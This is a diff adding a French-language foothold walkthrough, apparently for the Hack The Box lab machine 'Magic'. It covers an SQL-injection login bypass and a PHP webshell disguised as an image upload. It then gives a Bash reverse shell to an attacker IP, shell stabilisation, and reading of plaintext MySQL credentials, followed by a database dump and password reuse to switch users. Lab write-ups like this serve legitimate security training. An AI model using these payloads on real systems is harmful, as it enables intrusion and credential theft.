@@ -441,9 +441,240 @@ Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de r
 
 ## Prise pied
 
-- Vecteur d'entrée confirmé (faille, creds, LFI/RFI, upload…).
-- Payloads utilisés (extraits pertinents).
-- Stabilisation du shell (pty, rlwrap, tmux…), preuve d'accès (`id`, `whoami`, `hostname`).
+### Contournement de l’authentification par injection SQL
+
+Après l’énumération web, le premier point intéressant est le formulaire de connexion de l’application.
+
+La page demande un nom d’utilisateur et un mot de passe. À ce stade, il ne faut pas chercher immédiatement un compte valide, mais plutôt observer le comportement de l’application lorsque l’on injecte des caractères spéciaux dans les champs.
+
+Les tests sur les champs `username` et `password` montrent un comportement différent selon les entrées envoyées. Certaines valeurs provoquent une redirection ou une réaction inhabituelle de l’application. Ce type de différence est un indice classique d’une possible injection SQL.
+
+En exploitant cette faiblesse, il est possible de contourner l’authentification et d’accéder à la zone d’upload de l’application.
+
+La chaîne commence donc par une injection SQL sur le formulaire de connexion :
+
+```text
+SQL injection → accès à la zone d’upload
+```
+
+### Transformation de l’upload en exécution de commandes
+
+Une fois connecté à la zone d’upload, l’objectif est de vérifier si le mécanisme d’envoi d’image peut être détourné.
+
+L’application attend normalement un fichier image. L’idée consiste donc à envoyer un fichier qui ressemble à une image du point de vue du formulaire, mais qui contient du code PHP exécutable côté serveur.
+
+Un fichier avec une double extension, par exemple du type `.php.png`, permet de tester ce comportement.
+
+Le contenu PHP utilisé reste volontairement minimal :
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Ce code exécute la commande passée dans le paramètre `cmd`.
+
+Après l’upload, le fichier est accessible dans le répertoire suivant :
+
+```text
+/images/uploads/
+```
+
+On peut alors appeler le fichier uploadé en ajoutant un paramètre `cmd` dans l’URL.
+
+Par exemple, pour tester l’exécution de commandes :
+
+```text
+http://magic.htb/images/uploads/shell.php.png?cmd=id
+```
+
+La réponse confirme l’exécution de commandes côté serveur. Le contexte obtenu est celui de l’utilisateur web :
+
+```text
+www-data
+```
+
+À ce stade, nous disposons d’un webshell simple permettant d’exécuter des commandes sur la machine cible.
+
+La chaîne devient :
+
+```text
+SQL injection → accès upload → fichier PHP déguisé en image → webshell www-data
+```
+
+### Obtention d’un reverse shell
+
+Le webshell permet d’exécuter des commandes, mais ce n’est pas très confortable pour travailler. L’étape suivante consiste donc à obtenir un reverse shell vers Kali.
+
+Sur Kali, on commence par mettre en écoute un port avec `nc` :
+
+```bash
+nc -lvnp 4444
+```
+
+Depuis le webshell, on lance ensuite un reverse shell Bash vers l’adresse VPN de Kali.
+
+Le point important ici est d’utiliser `bash -c` :
+
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.16.20/4444 0>&1'
+```
+
+L’utilisation de `bash -c` est importante, car elle force Bash à interpréter lui-même les redirections ainsi que `/dev/tcp`. Sans cela, la commande peut échouer selon le shell réellement utilisé derrière l’appel PHP.
+
+Une fois la commande exécutée depuis le webshell, une connexion arrive sur Kali.
+
+Nous obtenons alors un shell interactif avec le contexte `www-data`.
+
+### Stabilisation du shell
+
+Le reverse shell obtenu fonctionne, mais il reste basique. Pour rendre l’interaction plus confortable, on le stabilise avec la méthode classique.
+
+Dans le shell distant :
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Ensuite, côté Kali, on suspend le shell avec `Ctrl+Z`, puis on configure le terminal local :
+
+```bash
+stty raw -echo; fg
+```
+
+Après le retour dans le shell distant, on termine la stabilisation :
+
+```bash
+export TERM=xterm
+stty rows 40 columns 120
+```
+
+À partir de ce moment, le shell est plus agréable à utiliser : l’affichage est meilleur, les commandes interactives fonctionnent mieux, et l’on peut poursuivre l’énumération locale dans de meilleures conditions.
+
+### Recherche des fichiers de configuration
+
+Une fois dans le contexte `www-data`, l’objectif est de comprendre comment l’application web fonctionne et où elle stocke ses informations sensibles.
+
+Comme l’application est hébergée sous `/var/www`, on commence par rechercher les fichiers de configuration et les fichiers liés à une base de données.
+
+La commande générique retenue est :
+
+```bash
+find /var/www -type f \( -iname "*config*" -o -iname "*db*" -o -iname "*database*" \) 2>/dev/null
+```
+
+Cette recherche permet de découvrir un fichier intéressant :
+
+```text
+/var/www/Magic/db.php5
+```
+
+On lit ensuite son contenu :
+
+```bash
+cat /var/www/Magic/db.php5
+```
+
+Le fichier contient des identifiants MySQL utilisés par l’application :
+
+```text
+database : Magic
+user     : theseus
+password : iamkingtheseus
+host     : localhost
+```
+
+Ces identifiants ne donnent pas encore directement un accès système, mais ils permettent d’interroger la base de données locale.
+
+### Énumération de la base MySQL
+
+Sur la machine cible, le client `mysql` classique n’est pas disponible. En revanche, d’autres outils MySQL sont présents, notamment `mysqlshow` et `mysqldump`.
+
+On peut d’abord vérifier l’accès à la base `Magic` avec `mysqlshow` :
+
+```bash
+mysqlshow -u theseus -piamkingtheseus Magic
+```
+
+L’accès fonctionne et permet d’identifier une table intéressante :
+
+```text
+login
+```
+
+On utilise ensuite `mysqldump` pour lire le contenu de cette table :
+
+```bash
+mysqldump -u theseus -piamkingtheseus Magic login
+```
+
+Le dump révèle une entrée contenant les identifiants de connexion de l’application :
+
+```sql
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+```
+
+Le mot de passe trouvé est donc :
+
+```text
+Th3s3usW4sK1ng
+```
+
+### Réutilisation du mot de passe pour devenir theseus
+
+À ce stade, nous avons un mot de passe issu de la base de données de l’application.
+
+Comme l’utilisateur MySQL s’appelle `theseus`, il est logique de tester une éventuelle réutilisation de mot de passe avec l’utilisateur local du même nom.
+
+Depuis le shell `www-data`, on tente donc de changer d’utilisateur :
+
+```bash
+su - theseus
+```
+
+Lorsque le mot de passe est demandé, on fournit :
+
+```text
+Th3s3usW4sK1ng
+```
+
+Le changement d’utilisateur fonctionne. Nous passons alors du contexte web `www-data` au compte local `theseus`.
+
+On peut confirmer l’identité courante avec :
+
+```bash
+id
+```
+
+Nous pouvons ensuite lire le flag utilisateur :
+
+```bash
+cat user.txt
+```
+
+### Résumé de la chaîne de prise de pied
+
+La prise de pied sur Magic repose sur une chaîne progressive assez classique, mais très pédagogique.
+
+On commence par contourner l’authentification grâce à une injection SQL. Cela donne accès à une fonctionnalité d’upload, qui est ensuite détournée pour envoyer un fichier PHP déguisé en image. Ce fichier devient un webshell permettant d’exécuter des commandes en tant que `www-data`.
+
+À partir de ce webshell, un reverse shell Bash est lancé vers Kali, puis stabilisé. L’énumération locale permet ensuite de découvrir le fichier `/var/www/Magic/db.php5`, qui contient les identifiants MySQL de l’application.
+
+Comme le client `mysql` n’est pas disponible, on utilise `mysqlshow` et `mysqldump` pour explorer la base `Magic`. Le dump de la table `login` révèle un mot de passe, qui est ensuite réutilisé avec succès pour passer sur l’utilisateur local `theseus`.
+
+La chaîne complète est donc :
+
+```text
+SQL injection
+→ accès à la zone d’upload
+→ fichier PHP déguisé en image
+→ webshell
+→ reverse shell www-data
+→ découverte de db.php5
+→ accès MySQL
+→ dump de la table login
+→ réutilisation du mot de passe
+→ utilisateur theseus
+```
 
 ---
 
